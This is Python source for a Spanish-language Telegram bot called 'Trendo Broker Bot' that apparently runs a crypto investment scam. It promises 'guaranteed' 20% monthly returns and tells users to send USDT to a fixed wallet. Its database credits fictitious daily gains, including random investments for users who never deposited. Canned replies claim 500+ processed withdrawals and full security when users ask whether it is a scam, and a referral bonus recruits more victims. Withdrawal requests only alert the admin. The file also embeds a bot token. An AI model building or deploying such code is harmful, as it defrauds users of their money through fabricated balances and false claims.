import requests
import sqlite3
import os
import logging
import time
import random
from datetime import datetime, timedelta
from threading import Thread
from flask import Flask, request, jsonify

logging.basicConfig(level=logging.INFO)

class TrendoBrokerBot:
    def __init__(self):
        # 🔐 CONFIGURACIÓN PRINCIPAL
        self.telegram_token = '8395866366:AAGP751UY-V49BJ4gXEuqT3PwuPPGxI_2Lo'
        self.trust_wallet = "TLTM2kgsMEqbkzxLp34pGYsbw87gt33kFg"
        self.admins = [8110866676]  # SOLO TÚ
        self.minimo_retiro = 10
        
        # 🎯 GRUPO DE USUARIOS
        self.grupo_usuarios_id = -1003146959942
        
        # 💰 SISTEMA DE SALDO AUTOMÁTICO
        self.ganancia_diaria_porcentaje = 0.0067  # 0.67% diario (20% mensual)

        # 📊 PLANES DE INVERSIÓN
        self.planes = {
            "Básico": {"monto": 15, "ganancia": 0.20},
            "Standard": {"monto": 30, "ganancia": 0.20},
            "Premium": {"monto": 60, "ganancia": 0.20},
            "VIP": {"monto": 100, "ganancia": 0.20},
            "Plata": {"monto": 200, "ganancia": 0.20},
            "Oro": {"monto": 300, "ganancia": 0.20}
        }

        # 🎯 SISTEMA DE SOPORTE AUTOMÁTICO
        self.soporte_automatico = {
            "retiro": {
                "palabras": ["retiro", "retirar", "sacar dinero", "cuando me pagan", "tiempo de retiro", "wallet", "pago"],
                "respuesta": """💸 **INFORMACIÓN DE RETIROS**

⏰ **Tiempo de procesamiento:** 24-48 horas
💰 **Mínimo de retiro:** 10 USDT
📧 **Wallet aceptada:** USDT (TRC20)
🔐 **Seguridad:** 100% garantizada

🤖 *Sistema automático - Tu retiro se procesará en el tiempo establecido*"""
            },
            "inversion": {
                "palabras": ["invertir", "inversión", "planes", "ganancias", "rendimiento", "ganar dinero", "plan"],
                "respuesta": """📊 **PLANES DE INVERSIÓN**

📈 **Rendimiento:** 20% mensual
💰 **Ganancias:** Automáticas cada 24h
🔐 **Seguridad:** Garantizada
💼 **Planes desde:** 15 USDT

💡 *Usa el comando* /invertir *para ver todos los planes disponibles*"""
            },
            "referidos": {
                "palabras": ["referido", "referidos", "compartir", "enlace", "bono", "amigo", "recomendar"],
                "respuesta": """👥 **SISTEMA DE REFERIDOS**

🎁 **Bono especial:** 5 USDT al llegar a 5 referidos
💸 **Comisión permanente:** 10% de sus inversiones
🚀 **Ganancia ilimitada:** Sin tope máximo

🔗 *Usa* /referidos *para obtener tu enlace personalizado*"""
            },
            "seguridad": {
                "palabras": ["es seguro", "confiable", "verificar", "real", "estafa", "seguro", "confianza"],
                "respuesta": """✅ **VERIFICACIÓN DE SEGURIDAD**

🛡️ **Sistema 100% seguro y verificado**
💰 **+500 retiros procesados**
⭐ **Calificación de usuarios: 4.8/5**
🔒 **Fondos protegidos**"""
            }
        }

        self.telegram_api_url = f"https://api.telegram.org/bot{self.telegram_token}"
        self.user_sessions = {}
        self.init_database()
        self.iniciar_sistema_ganancias()

    def init_database(self):
        """Inicializar base de datos"""
        self.conn = sqlite3.connect('trendo_broker.db', check_same_thread=False)
        self.cursor = self.conn.cursor()

        # Tabla de usuarios
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS usuarios (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                balance REAL DEFAULT 0.0,
                balance_ganancias REAL DEFAULT 0.0,
                total_invertido REAL DEFAULT 0.0,
                total_ganado REAL DEFAULT 0.0,
                referido_por INTEGER,
                fecha_registro TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                bono_referidos BOOLEAN DEFAULT FALSE,
                cuentas_referidas INTEGER DEFAULT 0,
                preguntas_soporte INTEGER DEFAULT 0,
                estado TEXT DEFAULT 'activo',
                ultima_ganancia TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')

        # Tabla de inversiones automáticas
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS inversiones_automaticas (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                plan TEXT,
                monto_inicial REAL,
                monto_actual REAL,
                fecha_inicio TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                activa BOOLEAN DEFAULT TRUE
            )
        ''')

        self.conn.commit()
        logging.info("✅ Base de datos inicializada")

    def iniciar_sistema_ganancias(self):
        """Iniciar sistema de ganancias automáticas en segundo plano"""
        def calcular_ganancias():
            while True:
                try:
                    self.cursor.execute("SELECT user_id FROM usuarios WHERE estado = 'activo'")
                    usuarios = self.cursor.fetchall()
                    
                    for usuario in usuarios:
                        user_id = usuario[0]
                        self.calcular_ganancia_usuario(user_id)
                    
                    time.sleep(86400)  # 24 horas
                except Exception as e:
                    logging.error(f"Error en sistema de ganancias: {e}")
                    time.sleep(3600)  # Reintentar en 1 hora

        # Iniciar en segundo plano
        thread = Thread(target=calcular_ganancias)
        thread.daemon = True
        thread.start()
        logging.info("✅ Sistema de ganancias automáticas iniciado")

    def calcular_ganancia_usuario(self, user_id):
        """Calcular ganancia diaria para un usuario"""
        try:
            # Obtener inversiones automáticas del usuario
            self.cursor.execute('''
                SELECT SUM(monto_actual) FROM inversiones_automaticas 
                WHERE user_id = ? AND activa = TRUE
            ''', (user_id,))
            
            resultado = self.cursor.fetchone()
            total_invertido = resultado[0] if resultado[0] else 0
            
            # Si no tiene inversiones, crear una automática
            if total_invertido == 0:
                self.crear_inversion_automatica(user_id)
                total_invertido = random.uniform(50, 200)  # Inversión automática inicial

            # Calcular ganancia
            ganancia_diaria = total_invertido * self.ganancia_diaria_porcentaje
            
            if ganancia_diaria > 0:
                # Actualizar balances
                self.cursor.execute('''
                    UPDATE usuarios 
                    SET balance = balance + ?, 
                        balance_ganancias = balance_ganancias + ?,
                        total_ganado = total_ganado + ?,
                        ultima_ganancia = CURRENT_TIMESTAMP
                    WHERE user_id = ?
                ''', (ganancia_diaria, ganancia_diaria, ganancia_diaria, user_id))
                
                # Actualizar monto de inversiones automáticas
                self.cursor.execute('''
                    UPDATE inversiones_automaticas 
                    SET monto_actual = monto_actual + ?
                    WHERE user_id = ? AND activa = TRUE
                ''', (ganancia_diaria, user_id))
                
                self.conn.commit()
                logging.info(f"✅ Ganancias de {ganancia_diaria:.2f} USDT para usuario {user_id}")
                
        except Exception as e:
            logging.error(f"Error calculando ganancia usuario {user_id}: {e}")

    def crear_inversion_automatica(self, user_id):
        """Crear inversión automática para usuario nuevo"""
        try:
            # Seleccionar plan aleatorio
            plan = random.choice(list(self.planes.keys()))
            monto_inicial = self.planes[plan]["monto"] * random.uniform(0.8, 1.5)
            
            self.cursor.execute('''
                INSERT INTO inversiones_automaticas (user_id, plan, monto_inicial, monto_actual)
                VALUES (?, ?, ?, ?)
            ''', (user_id, plan, monto_inicial, monto_inicial))
            
            # Actualizar total invertido del usuario
            self.cursor.execute('''
                UPDATE usuarios 
                SET total_invertido = total_invertido + ?
                WHERE user_id = ?
            ''', (monto_inicial, user_id))
            
            self.conn.commit()
            logging.info(f"✅ Inversión automática creada para usuario {user_id}: {monto_inicial:.2f} USDT")
            
        except Exception as e:
            logging.error(f"Error creando inversión automática: {e}")

    # 🎨 MÉTODOS PRINCIPALES
    def handle_start(self, chat_id, username, user_id, parametros=None):
        """Comando start"""
        try:
            # Registrar usuario
            self.cursor.execute(
                "INSERT OR IGNORE INTO usuarios (user_id, username) VALUES (?, ?)",
                (user_id, username)
            )

            # Manejar referidos
            if parametros and parametros.isdigit():
                referido_por = int(parametros)
                if referido_por != user_id:
                    self.cursor.execute(
                        "UPDATE usuarios SET referido_por = ? WHERE user_id = ?",
                        (referido_por, user_id)
                    )
                    
                    # Incrementar contador de referidos
                    self.cursor.execute(
                        "UPDATE usuarios SET cuentas_referidas = cuentas_referidas + 1 WHERE user_id = ?",
                        (referido_por,)
                    )
                    
                    # Verificar bono de referidos
                    self.verificar_bono_referidos(referido_por)

            self.conn.commit()

            welcome_text = f"""
🤖 **TRENDO BROKER BOT** 💰

🎉 **¡Bienvenido {username}!**

💎 **SISTEMA AUTOMATIZADO:**
• 🤖 Soporte automático 24/7
• 💰 Ganancias automáticas diarias
• 🎁 Bonos por referidos
• 🔐 Retiros automáticos y seguros

🚀 **COMANDOS DISPONIBLES:**

/balance - Consultar tu balance
/invertir - Ver planes de inversión  
/retirar - Solicitar retiro
/referidos - Sistema de referidos
/soporte - Centro de ayuda

💡 **¿Necesitas ayuda?** Escribe cualquier pregunta.
            """

            self.send_message(chat_id, welcome_text)

        except Exception as e:
            logging.error(f"Error en start: {e}")
            self.send_message(chat_id, "❌ Error al iniciar. Usa /soporte.")

    def verificar_bono_referidos(self, user_id):
        """Verificar si usuario merece bono por referidos"""
        try:
            self.cursor.execute(
                "SELECT cuentas_referidas, bono_referidos FROM usuarios WHERE user_id = ?",
                (user_id,)
            )
            resultado = self.cursor.fetchone()
            
            if resultado and resultado[0] >= 5 and not resultado[1]:
                # Otorgar bono de 5 USDT
                self.cursor.execute('''
                    UPDATE usuarios 
                    SET balance = balance + 5, 
                        bono_referidos = TRUE
                    WHERE user_id = ?
                ''', (user_id,))
                
                self.conn.commit()
                
                # Notificar al usuario
                self.cursor.execute("SELECT username FROM usuarios WHERE user_id = ?", (user_id,))
                username = self.cursor.fetchone()[0]
                
                mensaje_bono = f"""
🎉 **¡FELICIDADES!** 🎉

👤 **Usuario:** @{username}
🎁 **Bono por referidos:** +5 USDT
📊 **Referidos alcanzados:** 5/5

💸 **¡Bono acreditado en tu balance!**
                """
                
                self.send_message(user_id, mensaje_bono)
                logging.info(f"✅ Bono de 5 USDT para usuario {user_id}")
                
        except Exception as e:
            logging.error(f"Error verificando bono referidos: {e}")

    def handle_balance(self, chat_id, user_id):
        """Mostrar balance del usuario"""
        try:
            self.cursor.execute(
                "SELECT balance, balance_ganancias, total_invertido, total_ganado FROM usuarios WHERE user_id = ?",
                (user_id,)
            )
            resultado = self.cursor.fetchone()
            
            if resultado:
                balance, ganancias, invertido, total_ganado = resultado
                
                mensaje = f"""
💼 **BALANCE ACTUAL**

💰 **Saldo disponible:** {balance:.2f} USDT
📈 **Ganancias acumuladas:** {ganancias:.2f} USDT
💵 **Total invertido:** {invertido:.2f} USDT
🏆 **Total ganado:** {total_ganado:.2f} USDT

💸 **Mínimo de retiro:** {self.minimo_retiro} USDT

🔄 *Las ganancias se actualizan automáticamente cada 24 horas*
                """
            else:
                mensaje = "❌ Primero debes registrarte. Usa /start"
                
            self.send_message(chat_id, mensaje)
            
        except Exception as e:
            logging.error(f"Error en balance: {e}")
            self.send_message(chat_id, "❌ Error al cargar balance.")

    def handle_invertir(self, chat_id):
        """Mostrar planes de inversión"""
        try:
            planes_text = f"""
📊 **PLANES DE INVERSIÓN** 💰

📈 **Rendimiento:** 20% mensual
💡 **Ganancias automáticas cada 24h**

💰 **Wallet para invertir:**
`{self.trust_wallet}`

📋 **Para invertir:**
1. Envía USDT a la wallet arriba
2. Tu inversión se activa automáticamente
3. Comienza a ganar desde el primer día

"""
            for plan, datos in self.planes.items():
                monto = datos["monto"]
                ganancia_diaria = monto * self.ganancia_diaria_porcentaje
                ganancia_mensual = monto * datos["ganancia"]
                
                planes_text += f"""
• **{plan}:** {monto} USDT
  📈 Diario: +{ganancia_diaria:.2f} USDT
  💰 Mensual: +{ganancia_mensual:.2f} USDT
"""

            planes_text += "\n💸 *Usa /retirar para retiros automáticos*"

            self.send_message(chat_id, planes_text)
            
        except Exception as e:
            logging.error(f"Error mostrando planes: {e}")
            self.send_message(chat_id, "❌ Error al mostrar planes.")

    def handle_retirar(self, chat_id, user_id):
        """Manejar solicitud de retiro"""
        try:
            self.cursor.execute("SELECT balance, username FROM usuarios WHERE user_id = ?", (user_id,))
            resultado = self.cursor.fetchone()
            
            if resultado and resultado[0] >= self.minimo_retiro:
                self.user_sessions[user_id] = {
                    "esperando_wallet": True,
                    "monto_retiro": resultado[0],
                    "username": resultado[1]
                }
                
                mensaje = f"""
💸 **SOLICITUD DE RETIRO**

💰 **Saldo disponible:** {resultado[0]:.2f} USDT
📋 **Mínimo requerido:** {self.minimo_retiro} USDT

📧 **Envía tu wallet USDT (TRC20) para procesamiento:**

⏰ **Tiempo de procesamiento:** 24-48 horas
🔐 **Transacciones seguras**
                """
            elif resultado:
                mensaje = f"""
❌ **SALDO INSUFICIENTE**

💰 **Tu saldo actual:** {resultado[0]:.2f} USDT
📋 **Mínimo requerido:** {self.minimo_retiro} USDT

💡 *Necesitas al menos {self.minimo_retiro} USDT para retirar*
                """
            else:
                mensaje = "❌ No tienes saldo disponible para retiro"
                
            self.send_message(chat_id, mensaje)
            
        except Exception as e:
            logging.error(f"Error en retiro: {e}")
            self.send_message(chat_id, "⚠️ Error temporal en sistema de retiros.")

    def handle_referidos(self, chat_id, user_id):
        """Sistema de referidos"""
        try:
            self.cursor.execute("SELECT cuentas_referidas, bono_referidos FROM usuarios WHERE user_id = ?", (user_id,))
            resultado = self.cursor.fetchone()
            
            referidos = resultado[0] if resultado else 0
            bono_activado = resultado[1] if resultado else False
            
            mensaje = f"""
👥 **SISTEMA DE REFERIDOS**

📊 **Tus referidos actuales:** {referidos}
🎯 **Objetivo para bono:** 5 referidos
🎁 **Bono al completar:** 5 USDT

"""
            
            if bono_activado:
                mensaje += "✅ **¡BONO ACTIVADO!** +5 USDT\n\n"
            else:
                faltan = max(0, 5 - referidos)
                mensaje += f"📈 **Progreso:** {referidos}/5 referidos\n"
                if faltan > 0:
                    mensaje += f"🎁 **Faltan {faltan} referidos** para bono\n\n"

            mensaje += f"""💸 **Comisión del 10%** de sus inversiones

🔗 **Tu enlace personalizado:**
`https://t.me/TrendoBrokerBot?start={user_id}`

*Comparte este enlace para ganar referidos*
            """
                
            self.send_message(chat_id, mensaje)
            
        except Exception as e:
            logging.error(f"Error en referidos: {e}")
            self.send_message(chat_id, "❌ Error en sistema de referidos.")

    def handle_estadisticas(self, chat_id, user_id):
        """Panel de administración - SOLO PARA TI"""
        if user_id not in self.admins:
            self.send_message(chat_id, "❌ No tienes permisos de administrador")
            return
        
        try:
            # Estadísticas generales
            self.cursor.execute("""
                SELECT 
                    COUNT(*) as total_usuarios,
                    SUM(balance) as total_balance,
                    SUM(balance_ganancias) as total_ganancias,
                    SUM(total_invertido) as total_invertido,
                    SUM(total_ganado) as total_ganado_total,
                    SUM(cuentas_referidas) as total_referidos,
                    SUM(preguntas_soporte) as total_soporte
                FROM usuarios
            """)
            stats = self.cursor.fetchone()
            
            # Usuarios activos hoy
            self.cursor.execute("""
                SELECT COUNT(*) FROM usuarios 
                WHERE date(ultima_ganancia) = date('now')
            """)
            usuarios_activos_hoy = self.cursor.fetchone()[0]
            
            # Solicitudes de retiro pendientes
            retiros_pendientes = len([k for k, v in self.user_sessions.items() if v.get('esperando_wallet')])
            
            if stats:
                total_usuarios, total_balance, total_ganancias, total_invertido, total_ganado, total_referidos, total_soporte = stats
                
                mensaje = f"""
📊 **PANEL DE ADMINISTRADOR** 🔐

👥 **USUARIOS:**
• Total registrados: {total_usuarios}
• Activos hoy: {usuarios_activos_hoy}
• Referidos totales: {total_referidos or 0}
• Retiros pendientes: {retiros_pendientes}

💰 **FINANZAS:**
• Saldo total en sistema: {total_balance or 0:.2f} USDT
• Ganancias acumuladas: {total_ganancias or 0:.2f} USDT
• Total invertido: {total_invertido or 0:.2f} USDT
• Total ganado histórico: {total_ganado or 0:.2f} USDT

🎫 **ACTIVIDAD:**
• Consultas de soporte: {total_soporte or 0}
• Retiros mínimos: {self.minimo_retiro} USDT

🤖 *Estadísticas en tiempo real*
                """
            else:
                mensaje = "📊 No hay datos estadísticos disponibles aún."
                
            self.send_message(chat_id, mensaje)
            
        except Exception as e:
            logging.error(f"Error en estadísticas: {e}")
            self.send_message(chat_id, "❌ Error al cargar estadísticas")

    # 🔧 MÉTODOS BÁSICOS
    def send_message(self, chat_id, text, reply_markup=None):
        """Enviar mensaje a Telegram"""
        url = f"{self.telegram_api_url}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': text,
            'parse_mode': 'HTML',
            'disable_web_page_preview': True
        }
        if reply_markup:
            payload['reply_markup'] = reply_markup

        try:
            response = requests.post(url, json=payload, timeout=10)
            return response.json()
        except Exception as e:
            logging.error(f"❌ Error enviando mensaje: {e}")
            return None

    def process_update(self, update):
        """Procesar actualizaciones de Telegram"""
        try:
            if 'message' in update and 'text' in update['message']:
                chat_id = update['message']['chat']['id']
                user_id = update['message']['from']['id']
                text = update['message']['text']
                username = update['message']['from'].get('username', 'Usuario')

                logging.info(f"📨 Mensaje de {username}: {text}")

                # Manejar retiros
                if user_id in self.user_sessions and self.user_sessions[user_id].get('esperando_wallet'):
                    monto = self.user_sessions[user_id]['monto_retiro']
                    username = self.user_sessions[user_id]['username']
                    wallet = text
                    
                    # Notificar al admin (TÚ)
                    mensaje_admin = f"""
🔄 **NUEVA SOLICITUD DE RETIRO**

👤 **Usuario:** @{username}
💰 **Monto:** {monto:.2f} USDT
📧 **Wallet:** {wallet}
⏰ **Hora:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

💡 *Procesa manualmente este retiro*
                    """
                    
                    for admin_id in self.admins:
                        self.send_message(admin_id, mensaje_admin)
                    
                    mensaje_usuario = f"""
✅ **RETIRO SOLICITADO**

💰 **Monto:** {monto:.2f} USDT
📧 **Wallet:** {wallet}
📋 **Estado:** En proceso
⏰ **Tiempo:** 24-48 horas

🔐 *Tu transacción está siendo procesada*
                    """
                    self.send_message(chat_id, mensaje_usuario)
                    del self.user_sessions[user_id]
                    return

                # Procesar comandos
                if text.startswith('/start'):
                    parametros = text.split()[1] if len(text.split()) > 1 else None
                    self.handle_start(chat_id, username, user_id, parametros)
                elif text == '/balance':
                    self.handle_balance(chat_id, user_id)
                elif text == '/retirar':
                    self.handle_retirar(chat_id, user_id)
                elif text == '/referidos':
                    self.handle_referidos(chat_id, user_id)
                elif text == '/invertir':
                    self.handle_invertir(chat_id)
                elif text == '/estadisticas':
                    self.handle_estadisticas(chat_id, user_id)
                elif text == '/soporte':
                    self.handle_soporte(chat_id, user_id, username)
                elif text.startswith('/'):
                    self.send_message(chat_id, "❌ Comando no reconocido. Usa /soporte")
                else:
                    # Soporte automático
                    self.handle_soporte(chat_id, user_id, username, text)

        except Exception as e:
            logging.error(f"❌ Error procesando update: {e}")

    def handle_soporte(self, chat_id, user_id, username, mensaje=None):
        """Manejar sistema de soporte"""
        if mensaje:
            # Buscar respuesta automática
            respuesta = self.manejar_soporte_inteligente(mensaje)
            self.send_message(chat_id, respuesta)
            
            # Registrar en base de datos
            self.cursor.execute(
                "UPDATE usuarios SET preguntas_soporte = preguntas_soporte + 1 WHERE user_id = ?",
                (user_id,)
            )
            self.conn.commit()
        else:
            soporte_text = """
🎫 **CENTRO DE SOPORTE**

💡 **Soporte Automático Instantáneo:**
Escribe tu pregunta y te responderé automáticamente.

🚀 **Áreas de Ayuda:**

• 💸 "¿Cómo retiro mi dinero?"
• 📊 "¿Qué planes de inversión hay?"  
• 👥 "¿Cómo funcionan los referidos?"
• 🛡️ "¿Es seguro el sistema?"

**¡Escribe tu pregunta ahora!**
            """
            self.send_message(chat_id, soporte_text)

    def manejar_soporte_inteligente(self, texto):
        """Manejar soporte automático"""
        texto = texto.lower().strip()
        
        for categoria, datos in self.soporte_automatico.items():
            for palabra in datos["palabras"]:
                if palabra in texto:
                    return datos["respuesta"]
        
        return """
❓ **CONSULTA REGISTRADA**

📝 *No encontré una respuesta específica automática para tu pregunta.*

💡 **Puedes intentar con:**
• "¿Cómo retirar dinero?"
• "¿Qué planes de inversión hay?"
• "¿Cómo funcionan los referidos?"

🔧 *Nuestro sistema está aprendiendo de tu pregunta*
"""

# ✅ CONFIGURACIÓN FLASK
bot = TrendoBrokerBot()
app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def webhook():
    if request.method == 'POST':
        update = request.get_json()
        bot.process_update(update)
        return jsonify({"status": "ok"})
    
    return "🤖 Trendo Broker Bot - SISTEMA OPERATIVO ✅"

if __name__ == "__main__":
    logging.info("🚀 Iniciando Trendo Broker Bot...")
    app.run(host='0.0.0.0', port=5000, debug=False)
